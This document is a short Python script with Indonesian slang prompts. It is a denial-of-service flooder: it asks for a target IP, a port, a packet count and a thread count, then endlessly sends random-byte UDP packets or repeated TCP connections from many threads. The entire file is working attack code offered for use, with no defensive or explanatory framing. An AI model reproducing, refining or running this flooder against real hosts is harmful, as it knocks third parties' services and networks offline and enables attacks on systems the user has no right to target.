#!/usr/bin/env python3
#Code by TititKudanil
import random
import socket
import threading

print("--> DJONGER <--")
print("#-- FF HENGKER WIBU PROO --#")
ip = str(input(" IPNYA NGAB:"))
port = int(input(" PORTNYE NGAB:"))
choice = str(input(" ACCEPT?(y/n):"))
times = int(input(" JUMLAH PAKET YANG MAU DIANTAR:"))
threads = int(input(" Threads:"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[:V]","[:V]","[:V]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" PAKET SEDANG DALAM PERJALANAN KE ALAMAT YANG ANDA TUJU MOHON TUNGGU!!!")
		except:
			print("[:/] ANYING KEBANYAKAN ASUU!!!")

def run2():
	data = random._urandom(16)
	i = random.choice(("[:V]","[:V]","[:V]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" PAKET SEDANG DALAM PERJALANAN KE ALAMAT YANG ANDA TUJU MOHON TUNGGU!!!")
		except:
			s.close()
			print("[:/] ANYING KEBANYAKAN ASUU")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
